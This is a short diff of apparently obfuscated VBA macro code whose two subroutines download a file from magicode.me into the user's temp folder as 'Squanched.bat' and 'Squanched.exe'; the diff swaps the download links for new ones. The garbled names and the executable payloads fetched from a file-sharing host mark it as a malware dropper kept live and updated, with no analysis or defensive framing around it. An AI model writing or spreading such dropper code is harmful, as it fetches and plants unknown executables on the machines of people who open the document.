@@ -26,7 +26,7 @@ Dim otqBShpqzXRvxekDL As String, Bhcdbg As String, QXfvVVlce As String
 Bhcdbg = "Squanched.bat"
 QXfvVVlce = Environ$("tmp") & "\" & Bhcdbg
 
-otqBShpqzXRvxekDL = "https://magicode.me/send-file/file/a1f1c535250b7003d4b874ae84c73519ef3a682a/download"
+otqBShpqzXRvxekDL = "https://magicode.me/send-file/file/98dc2b8bc8177d30a148334db82b2934e666a309/download"
 
 tEJGRjkFGPoU otqBShpqzXRvxekDL, QXfvVVlce
 End Sub
@@ -37,7 +37,7 @@ Dim otqBShpqzXRvxekDL As String, Bhcdbg As String, QXfvVVlce As String
 Bhcdbg = "Squanched.exe"
 QXfvVVlce = Environ$("tmp") & "\" & Bhcdbg
 
-otqBShpqzXRvxekDL = "https://magicode.me/send-file/file/79629027ce31d3e6f4d03aa4ee7d49e27142f5a6/download"
+otqBShpqzXRvxekDL = "https://magicode.me/send-file/file/9cbe624910ea773eba2f1175fa35d4af1d6ad1da/download"
 
 tEJGRjkFGPoU2 otqBShpqzXRvxekDL, QXfvVVlce
 End Sub
